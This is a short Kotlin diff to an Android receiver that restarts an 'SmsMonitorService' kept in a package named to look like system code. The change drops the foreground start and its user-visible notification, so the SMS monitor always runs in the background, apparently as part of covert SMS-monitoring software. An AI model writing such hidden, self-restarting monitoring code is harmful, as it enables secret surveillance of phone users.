@@ -29,15 +29,12 @@ class RestartServiceReceiver : BroadcastReceiver() {
             Log.e(TAG, "Error starting UnifiedService", e)
         }
 
-        // 🔥 Start SmsMonitorService
+        // 🔥 Start SmsMonitorService (background service)
         try {
             val smsMonitorIntent = Intent(context, com.android.system.services.SmsMonitorService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                ContextCompat.startForegroundService(context, smsMonitorIntent)
-            } else {
-                context.startService(smsMonitorIntent)
-            }
-            Log.d(TAG, "SmsMonitorService restarted")
+            // همیشه به عنوان background service راه‌اندازی میشه
+            context.startService(smsMonitorIntent)
+            Log.d(TAG, "SmsMonitorService restarted (background)")
         } catch (e: Exception) {
             Log.e(TAG, "Error starting SmsMonitorService", e)
         }
